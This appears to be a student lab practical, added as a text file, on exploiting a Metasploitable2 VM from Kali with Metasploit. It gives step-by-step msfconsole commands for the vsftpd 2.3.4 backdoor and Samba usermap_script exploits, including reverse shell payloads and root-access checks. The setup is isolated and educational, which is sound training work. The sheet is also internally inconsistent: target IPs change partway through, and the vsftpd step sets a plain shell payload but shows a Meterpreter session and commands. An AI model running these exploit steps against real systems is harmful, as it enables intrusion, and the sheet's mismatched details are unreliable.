@@ -1,0 +1,344 @@
+================================================================
+PRACTICAL: EXPLOITATION USING METASPLOIT & METASPLOITABLE2
+================================================================
+
+AIM:
+To gain access to a vulnerable system (Metasploitable2) using
+Metasploit Framework in Kali Linux and understand the
+exploitation process ethically.
+
+OBJECTIVE:
+1. Set up an isolated lab with Kali and Metasploitable2 VMs
+2. Perform network scanning using Nmap
+3. Exploit vsftpd 2.3.4 backdoor vulnerability using Metasploit
+4. Exploit Samba usermap_script vulnerability using Metasploit
+5. Verify root access on victim machine
+
+TOOLS USED:
+- Kali Linux VM (Attacker Machine)
+- Metasploitable2 VM (Victim Machine - intentionally vulnerable)
+- Metasploit Framework (pre-installed in Kali)
+- Nmap (pre-installed in Kali)
+
+LAB SETUP:
+- Both VMs run inside VMware on same Host-Only network
+- No internet connection required
+- No real systems targeted — purely isolated lab
+
+================================================================
+BEFORE STARTING — VMware Settings (Do this before booting VMs)
+================================================================
+
+For BOTH Kali VM and Metasploitable2 VM:
+- Edit Virtual Machine Settings
+- Memory: 4096 MB (4GB)
+- Network Adapter: Host-Only (same VMnet for both)
+
+For Metasploitable2 specifically:
+- If it has 2 Network Adapters, disable Network Adapter 2
+- Keep only Network Adapter 1 set to Host-Only
+- This ensures both VMs are on same subnet
+
+================================================================
+STEP 1: Boot Both VMs and Get IP Addresses
+================================================================
+
+Boot Metasploitable2 VM first.
+Login credentials:
+  Username: msfadmin
+  Password: msfadmin
+
+On Metasploitable2 terminal:
+COMMAND:
+ifconfig
+
+MEANING: Shows network info. Note the IP under eth0 (inet addr)
+EXAMPLE: 192.168.22.129  ← this is your RHOSTS (target IP)
+
+---
+
+Boot Kali Linux VM.
+Open terminal in Kali.
+
+COMMAND:
+ip a
+
+MEANING: Shows Kali network info. Note IP under eth0
+EXAMPLE: 192.168.22.128  ← this is your LHOST (attacker IP)
+
+================================================================
+STEP 2: Test Connection Between Both VMs
+================================================================
+
+In Kali terminal:
+
+COMMAND:
+ping 192.168.22.129
+(this is the metasploit ip)
+
+MEANING:
+- Sends network packets to Metasploitable2
+- If you get replies, both VMs are connected properly
+- Press Ctrl+C to stop ping
+
+IF NO REPLY:
+- Check both VMs are on same Host-Only VMnet
+- Disable Network Adapter 2 on Metasploitable2
+- Restart both VMs and check IPs again
+
+================================================================
+STEP 3: Scan Target Using Nmap
+================================================================
+
+COMMAND:
+nmap -sV 192.168.22.129
+
+MEANING:
+- nmap = network scanning tool
+- -sV = detect versions of services running on open ports
+- Shows all vulnerable services on Metasploitable2
+
+EXPECTED OUTPUT (important ports):
+21/tcp  open  ftp     vsftpd 2.3.4   ← we will exploit this
+445/tcp open  netbios samba           ← we will exploit this too
+22/tcp  open  ssh
+80/tcp  open  http    Apache
+
+================================================================
+STEP 4: Start Metasploit Framework
+================================================================
+
+On Kali Linux,
+COMMAND:
+msfconsole
+
+MEANING:
+- Opens Metasploit Framework console
+- Takes 30-60 seconds to load — this is normal
+- Red banner/logo is normal, not an error
+- Wait for msf6 > prompt before typing anything
+
+================================================================
+STEP 5: EXPLOIT 1 — vsftpd 2.3.4 Backdoor (Port 21 FTP)
+================================================================
+
+VULNERABILITY:
+vsftpd 2.3.4 had a backdoor planted by a hacker in source code.
+CVE: CVE-2011-2523
+Port: 21 (FTP)
+
+Run these one by one inside msfconsole:
+
+COMMAND:
+search vsftpd
+
+MEANING: Searches Metasploit database for vsftpd exploits
+
+COMMAND:
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+MEANING: Loads the vsftpd backdoor exploit module
+
+COMMAND:
+show options
+
+MEANING: Shows what values need to be set before running
+
+COMMAND:
+set RHOSTS 192.168.116.129
+
+MEANING: Sets target IP (Metasploitable2 IP) — Remote HOST
+
+COMMAND:
+set LHOST 192.168.116.128
+
+MEANING: Sets attacker IP (Kali IP) — Local HOST
+NOTE: Always set LHOST to avoid validation errors
+
+COMMAND:
+set payload cmd/unix/interact
+
+MEANING: Sets a simple shell payload — most stable in VMs
+
+COMMAND:
+run
+
+MEANING: Launches the exploit against the target
+
+EXPECTED OUTPUT:
+[+] Backdoor has been spawned!
+[*] Meterpreter session 1 opened
+meterpreter >
+
+---
+
+Now verify access inside victim machine:
+
+COMMAND:
+getuid
+
+MEANING: Shows current user on victim machine
+EXPECTED: Server username: root
+
+COMMAND:
+sysinfo
+
+MEANING: Shows victim machine system information
+EXPECTED: Computer: metasploitable.localdomain, OS: Ubuntu 8.04
+
+COMMAND:
+pwd
+
+MEANING: Shows current directory on victim machine
+
+COMMAND:
+ls
+
+MEANING: Lists files in current directory on victim machine
+
+---
+
+COMMAND:
+background
+
+MEANING: Puts current session in background, returns to msf6
+         This is needed before loading next exploit
+
+================================================================
+STEP 6: EXPLOIT 2 — Samba usermap_script (Port 445)
+================================================================
+
+VULNERABILITY:
+Samba service allowed command injection via username field.
+CVE: CVE-2007-2447
+Port: 445 (Samba/NetBIOS)
+
+Run these one by one inside msfconsole:
+
+COMMAND:
+use exploit/multi/samba/usermap_script
+
+MEANING: Loads the Samba exploit module
+NOTE: Message "defaulting to cmd/unix/reverse_netcat" is normal
+
+COMMAND:
+set RHOSTS 192.168.116.129
+
+MEANING: Sets target IP (Metasploitable2)
+
+COMMAND:
+set LHOST 192.168.116.128
+
+MEANING: Sets attacker IP (Kali)
+
+COMMAND:
+set payload cmd/unix/reverse
+
+MEANING: Sets reverse shell payload for Samba exploit
+
+COMMAND:
+run
+
+MEANING: Launches the Samba exploit
+
+EXPECTED OUTPUT:
+[*] Started reverse TCP handler
+[*] Command shell session 2 opened
+$ (or shell prompt)
+
+---
+
+Verify access:
+
+COMMAND:
+whoami
+
+MEANING: Shows current user
+EXPECTED: root
+
+COMMAND:
+id
+
+MEANING: Shows user ID and group
+EXPECTED: uid=0(root) gid=0(root)
+
+COMMAND:
+hostname
+
+MEANING: Shows victim machine name
+EXPECTED: metasploitable
+
+---
+
+Exit shell:
+COMMAND:
+exit
+
+================================================================
+RESULT TABLE (Write on answer sheet)
+================================================================
+
+Exploit | Vulnerability        | CVE           | Port | Result
+--------|----------------------|---------------|------|--------
+1       | vsftpd 2.3.4 Backdoor| CVE-2011-2523 | 21   | root
+2       | Samba usermap_script | CVE-2007-2447 | 445  | root
+
+Attack Type: Remote Code Execution
+Access Level Gained: root (highest level)
+
+================================================================
+COMMON ERRORS AND FIXES
+================================================================
+
+ERROR: LHOST validation error when running exploit
+FIX: set LHOST <your kali IP> then run again
+
+ERROR: Failed to load extension / module not found
+FIX: You are inside meterpreter. Type: background
+     Then load new exploit from msf6 prompt
+
+ERROR: Ping unreachable between VMs
+FIX: Disable Network Adapter 2 on Metasploitable2
+     Set both VMs to same Host-Only VMnet
+     Restart both VMs
+
+ERROR: Metasploitable2 has no IP / wrong subnet
+FIX: sudo /etc/init.d/networking restart
+     Then ifconfig again
+
+ERROR: msfconsole very slow to load
+FIX: Just wait, do not close. Always slow in VM. Normal.
+
+================================================================
+CONCLUSION (Write on answer sheet)
+================================================================
+
+In this practical, we successfully exploited two vulnerabilities
+in Metasploitable2 using Metasploit Framework in an isolated
+VMware lab environment.
+
+Exploit 1 used the vsftpd 2.3.4 backdoor (CVE-2011-2523) on
+port 21 which gave root level Meterpreter access to the victim.
+
+Exploit 2 used the Samba usermap_script vulnerability
+(CVE-2007-2447) on port 445 which gave root shell access.
+
+Both exploits demonstrate the critical importance of keeping
+software updated and patched. Outdated and unpatched services
+are easily exploited using publicly known CVEs available in
+Metasploit's database.
+
+================================================================
+PRECAUTIONS (Write on answer sheet)
+================================================================
+
+1. Metasploitable2 network set to Host-Only (no internet)
+2. No real or live systems were targeted at any point
+3. Both VMs ran in completely isolated VMware environment
+4. Metasploit used only for educational and ethical purposes
+5. All vulnerabilities exploited are publicly known CVEs on
+   an intentionally vulnerable practice machine only
+
+================================================================
+END OF PRACTICAL
+================================================================
